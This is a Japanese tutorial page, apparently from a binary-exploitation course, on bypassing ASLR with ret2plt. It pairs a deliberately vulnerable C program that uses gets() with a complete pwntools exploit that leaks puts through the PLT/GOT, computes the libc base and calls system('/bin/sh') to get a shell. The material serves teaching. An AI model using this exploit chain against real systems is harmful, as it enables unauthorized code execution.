# ret2plt による ASLR バイパス

## 概要

今回はリークがありません。前に説明した ret2plt の手法を使う必要があります。先に進む前に、ぜひ自分で挑戦してみてください。

{% file src="../../../.gitbook/assets/ret2plt.zip" caption="ret2plt - 32-bit" %}

```c
#include <stdio.h>

void vuln() {
    puts("Come get me");

    char buffer[20];
    gets(buffer);
}

int main() {
    vuln();

    return 0;
}
```

## 解析

なんとかして ASLR のベースをリークする必要があり、現実的な方法は ret2plt しかありません。`gets()` は好きなだけデータを読み込むので、スペースには困りません。

## エクスプロイト

基本的な準備はすべて同じです。

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()
```

次に、`puts` の実アドレスをリークするペイロードを送ります。前に述べたとおり、関数の PLT エントリを呼ぶのは関数自体を呼ぶのと同じです。パラメータが GOT エントリを指すようにすれば、その実際の場所が出力されます。これは、C では文字列引数が実際には文字列の場所を指す**ポインタ**を受け取るためで、(場所がわかっている)GOT エントリを指すようにすれば、それが出力されるのです。

```python
p.recvline()        # just receive the first output

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)
```

ところで、なぜ `main` があるのでしょうか? 戻りアドレスをでたらめな値にすると、libc のベースはリークできても、そのあとクラッシュしてしまいます。しかし `main` を再び呼べば、実質的にバイナリを再起動できます。しかも今度は `libc` のベースがわかっているので、ret2libc を実行できます。

```python
p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)
```

GOT エントリだけが出力されるわけではない点を思い出してください。`puts` をはじめ C の多くの関数は、**null バイトまで**出力します。つまり GOT のアドレスが次々と出力され続けますが、必要なのは最初のひとつだけなので、先頭の 4 バイトを取り出し、`u32()` でリトルエンディアンの数値として解釈します。残りの値と、`main` を再び呼んだことによる `Come get me` は読み飛ばします。

ここからは、libc のベースをもう一度計算し、基本的な ret2libc を行うだけです。

```python
libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],            # exit is not required here, it's just nicer
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

これでシェルが取れました。

### 最終的なエクスプロイト

```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
    'A' * 32,
    elf.plt['puts'],
    elf.sym['main'],
    elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
    'A' * 32,
    libc.sym['system'],
    libc.sym['exit'],
    next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```

## 64 ビット

要領はもうおわかりでしょう。64 ビットでも同じことを試してみてください。よければ pwntools の ROP 機能を使ってもかまいませんし、呼び出し規約をきちんと理解できているか確かめるために、思い切って**両方**やってみてください :P

{% file src="../../../.gitbook/assets/ret2plt-64.zip" caption="ret2plt - 64-bit" %}

